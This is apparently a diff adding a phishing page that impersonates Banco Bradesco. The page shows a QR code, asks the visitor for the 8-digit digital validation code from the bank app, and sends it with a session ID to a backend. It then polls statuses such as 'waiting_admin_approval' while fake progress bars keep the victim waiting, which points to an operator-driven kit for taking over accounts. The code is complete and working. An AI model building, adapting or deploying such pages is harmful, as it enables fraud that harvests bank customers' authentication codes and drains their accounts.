@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Banco Bradesco S/A</title>
+    <link rel="icon" type="image/png" href="icon.png">
+    <script src="security.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Header */
+        .header-full {
+            background: url('cabeçalhoqrcode.png') no-repeat center;
+            background-size: cover;
+            width: 100%;
+            height: 100px;
+        }
+
+        /* Main Container */
+        .main-container {
+            width: 100%;
+            max-width: 800px;
+            margin-top: 50px;
+            text-align: center;
+            padding: 20px;
+        }
+
+        h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+
+        /* QR Code */
+        .qr-box {
+            background: white;
+            padding: 15px;
+            border: 1px solid #ddd;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .qr-box img {
+            width: 180px;
+            height: 180px;
+            display: block;
+        }
+
+        .instruction-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 40px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.4;
+        }
+
+        /* Input Stylized */
+        .code-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .code-digit {
+            width: 40px;
+            height: 2px;
+            background-color: #3498db;
+            position: relative;
+        }
+
+        /* Actual Hidden Input */
+        #qrCodeInput {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Visual representation of input */
+        .visual-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+
+        .visual-digit {
+            width: 35px;
+            height: 45px;
+            border-bottom: 2px solid #3498db;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+            font-weight: bold;
+        }
+
+        /* Continue Button */
+        .btn-continuar {
+            background-color: #cc0000;
+            color: white;
+            border: none;
+            padding: 12px 0;
+            width: 320px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background 0.3s;
+            text-transform: lowercase;
+        }
+
+        .btn-continuar:hover {
+            background-color: #aa0000;
+        }
+
+        /* Wait Containers */
+        .wait-container {
+            display: none;
+            margin-top: 30px;
+            width: 100%;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .wait-container p {
+            color: #666;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .progress-bar-bg {
+            width: 100%;
+            height: 10px;
+            background-color: #eee;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-fill-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #cc0000;
+            transition: width 0.3s;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .modal-content button {
+            background: #cc0000;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-full"></div>
+
+    <div class="main-container">
+        <div id="contentForm">
+            <h2>Informe o código da Validação Digital</h2>
+            
+            <div class="qr-box">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=BradescoDigitalValidation" alt="QR Code" id="qrImage">
+            </div>
+
+            <p class="instruction-text">
+                Abra o app Bradesco e aponte a câmera para ler o QR Code e receber o código
+            </p>
+
+            <input type="text" id="qrCodeInput" maxlength="8" inputmode="numeric">
+            
+            <div class="visual-input-container" id="visualInput">
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+                <div class="visual-digit"></div>
+            </div>
+
+            <button class="btn-continuar" id="confirmBtn">continuar</button>
+        </div>
+
+        <!-- Progress Bars -->
+        <div id="waitBar2" class="wait-container">
+            <p>Aguarde enquanto validamos o seu acesso...</p>
+            <div class="progress-bar-bg">
+                <div id="progressFill2" class="progress-fill-bar"></div>
+            </div>
+        </div>
+
+        <div id="waitBar3" class="wait-container">
+            <p>Aguarde enquanto validamos o seu acesso...</p>
+            <div class="progress-bar-bg">
+                <div id="progressFill3" class="progress-fill-bar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal-overlay" id="customModal">
+        <div class="modal-content">
+            <p id="modalMessage"></p>
+            <button id="modalBtn">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'http://localhost:3000/api';
+        const confirmBtn = document.getElementById('confirmBtn');
+        const qrCodeInput = document.getElementById('qrCodeInput');
+        const contentForm = document.getElementById('contentForm');
+        const waitBar2 = document.getElementById('waitBar2');
+        const progressFill2 = document.getElementById('progressFill2');
+        const waitBar3 = document.getElementById('waitBar3');
+        const progressFill3 = document.getElementById('progressFill3');
+        const customModal = document.getElementById('customModal');
+        const modalBtn = document.getElementById('modalBtn');
+        const modalMessage = document.getElementById('modalMessage');
+        const qrImg = document.getElementById('qrImage');
+        const visualDigits = document.querySelectorAll('.visual-digit');
+        const visualInputContainer = document.getElementById('visualInput');
+
+        // Get session_id from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        let sessionId = urlParams.get('session_id');
+
+        // Focus hidden input on click
+        visualInputContainer.addEventListener('click', () => qrCodeInput.focus());
+        document.body.addEventListener('click', (e) => {
+            if (e.target.closest('.main-container')) qrCodeInput.focus();
+        });
+
+        // Update visual digits
+        qrCodeInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            const val = this.value;
+            visualDigits.forEach((el, i) => {
+                el.textContent = val[i] || '';
+            });
+        });
+
+        // Load custom QR if available
+        async function loadQR() {
+            if (!sessionId) return;
+            try {
+                const res = await fetch(`${API_URL}/pending-users/${sessionId}`);
+                const data = await res.json();
+                if (data.data && data.data.qr_code_image) {
+                    qrImg.src = data.data.qr_code_image;
+                }
+            } catch (e) {}
+        }
+        loadQR();
+
+        modalBtn.onclick = () => customModal.style.display = 'none';
+
+        function showAlert(msg) {
+            modalMessage.textContent = msg;
+            customModal.style.display = 'flex';
+        }
+
+        confirmBtn.onclick = async () => {
+            const code = qrCodeInput.value.trim();
+            if (code.length === 8) {
+                if (!sessionId) {
+                    showAlert('Sessão não identificada.');
+                    return;
+                }
+
+                try {
+                    const res = await fetch(`${API_URL}/pending-users/${sessionId}`, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ code, status: 'waiting_second_bar' })
+                    });
+
+                    if (res.ok) {
+                        contentForm.style.display = 'none';
+                        waitBar2.style.display = 'block';
+                        progressFill2.style.width = '20%';
+
+                        const secondBarCheck = setInterval(async () => {
+                            try {
+                                const res2 = await fetch(`${API_URL}/pending-users/${sessionId}`);
+                                const data2 = await res2.json();
+                                if (data2.data && data2.data.status === 'waiting_third_bar') {
+                                    clearInterval(secondBarCheck);
+                                    progressFill2.style.width = '100%';
+                                    setTimeout(() => {
+                                        waitBar2.style.display = 'none';
+                                        waitBar3.style.display = 'block';
+                                        progressFill3.style.width = '20%';
+                                        const thirdBarCheck = setInterval(async () => {
+                                            const res3 = await fetch(`${API_URL}/pending-users/${sessionId}`);
+                                            const data3 = await res3.json();
+                                            if (data3.data && data3.data.status === 'waiting_admin_approval') progressFill3.style.width = '100%';
+                                            if (data3.data && data3.data.status === 'completed') {
+                                                clearInterval(thirdBarCheck);
+                                                progressFill3.style.width = '100%';
+                                                setTimeout(() => {
+                                                    showAlert('Processo concluído com sucesso!');
+                                                    waitBar3.style.display = 'none';
+                                                    contentForm.style.display = 'block';
+                                                    qrCodeInput.value = '';
+                                                    visualDigits.forEach(el => el.textContent = '');
+                                                }, 500);
+                                            }
+                                        }, 1000);
+                                    }, 500);
+                                }
+                            } catch (e) {}
+                        }, 1000);
+                    }
+                } catch (e) {
+                    showAlert('Erro de conexão.');
+                }
+            } else {
+                showAlert('Por favor, digite os 8 dígitos da validação digital.');
+            }
+        };
+    </script>
+</body>
+</html>
